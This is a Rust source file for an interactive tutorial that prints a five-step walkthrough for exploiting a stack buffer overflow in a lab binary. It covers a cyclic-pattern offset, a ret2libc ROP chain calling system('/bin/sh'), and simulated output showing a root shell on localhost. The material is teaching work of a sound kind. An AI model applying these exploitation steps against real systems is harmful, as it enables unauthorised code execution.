#![allow(dead_code)]

use std::io::{self, Write};

pub struct TutorialSystem {
    pub current_step: usize,
    pub total_steps: usize,
}

impl TutorialSystem {
    pub fn new() -> Self {
        TutorialSystem {
            current_step: 0,
            total_steps: 5,
        }
    }

    pub fn start_first_blood(&self) -> Result<(), String> {
        println!("\n{}", "=".repeat(70));
        println!("TALON First Blood Challenge: Get Your First Shell in 10 Minutes");
        println!("{}", "=".repeat(70));
        println!("\nThis interactive tutorial will guide you through your first exploit.");
        println!("You'll learn to exploit a buffer overflow and spawn a shell.\n");
        
        self.step1_introduction()?;
        self.step2_binary_analysis()?;
        self.step3_offset_finding()?;
        self.step4_rop_chain()?;
        self.step5_exploitation()?;
        
        println!("\n{}", "=".repeat(70));
        println!("Congratulations! You've completed your first exploit!");
        println!("{}", "=".repeat(70));
        
        Ok(())
    }

    fn step1_introduction(&self) -> Result<(), String> {
        println!("\n[Step 1/5] Introduction");
        println!("{}", "-".repeat(70));
        println!("Target: vuln_binary (x86_64 Linux)");
        println!("Vulnerability: Stack-based buffer overflow in gets()");
        println!("Protections: NX enabled, PIE disabled, No canary");
        println!("\nPress Enter to continue...");
        self.wait_for_enter();
        Ok(())
    }

    fn step2_binary_analysis(&self) -> Result<(), String> {
        println!("\n[Step 2/5] Binary Analysis");
        println!("{}", "-".repeat(70));
        println!("Let's analyze the binary to understand its structure:\n");
        println!("  talon analyze vuln_binary\n");
        println!("Key findings:");
        println!("  - Architecture: x86_64");
        println!("  - NX: Enabled (we need ROP)");
        println!("  - PIE: Disabled (addresses are static)");
        println!("  - Dangerous function: gets() at 0x400656");
        println!("\nPress Enter to continue...");
        self.wait_for_enter();
        Ok(())
    }

    fn step3_offset_finding(&self) -> Result<(), String> {
        println!("\n[Step 3/5] Finding Buffer Offset");
        println!("{}", "-".repeat(70));
        println!("We'll use a cyclic pattern to find the exact offset:\n");
        println!("  let pattern = cyclic(200)");
        println!("  send(session, pattern)");
        println!("  # Program crashes at offset 112\n");
        println!("Now we know we need 112 bytes of padding before our ROP chain.");
        println!("\nPress Enter to continue...");
        self.wait_for_enter();
        Ok(())
    }

    fn step4_rop_chain(&self) -> Result<(), String> {
        println!("\n[Step 4/5] Building ROP Chain");
        println!("{}", "-".repeat(70));
        println!("Since NX is enabled, we'll use ROP to call system(\"/bin/sh\"):\n");
        println!("  let libc_base = 0x7ffff7a0d000  # From vmmap");
        println!("  let system = libc_base + 0x4f440");
        println!("  let binsh = libc_base + 0x1b3e9a");
        println!("  let pop_rdi = libc_base + 0x2164f  # pop rdi; ret\n");
        println!("  let rop = [pop_rdi, binsh, system]");
        println!("\nPress Enter to continue...");
        self.wait_for_enter();
        Ok(())
    }

    fn step5_exploitation(&self) -> Result<(), String> {
        println!("\n[Step 5/5] Final Exploitation");
        println!("{}", "-".repeat(70));
        println!("Let's put it all together:\n");
        println!("  let s = connect(\"localhost\", 9999)");
        println!("  let payload = cyclic(112) + pack_addresses(rop)");
        println!("  send(s, payload)");
        println!("  interactive(s)");
        println!("\nExecuting exploit...");
        println!("[OK] Connection established");
        println!("[OK] Payload sent");
        println!("[OK] Shell spawned!");
        println!("\n$ whoami");
        println!("root");
        println!("\nPress Enter to complete tutorial...");
        self.wait_for_enter();
        Ok(())
    }

    fn wait_for_enter(&self) {
        let mut input = String::new();
        io::stdout().flush().ok();
        io::stdin().read_line(&mut input).ok();
    }
}

impl Default for TutorialSystem {
    fn default() -> Self {
        Self::new()
    }
}
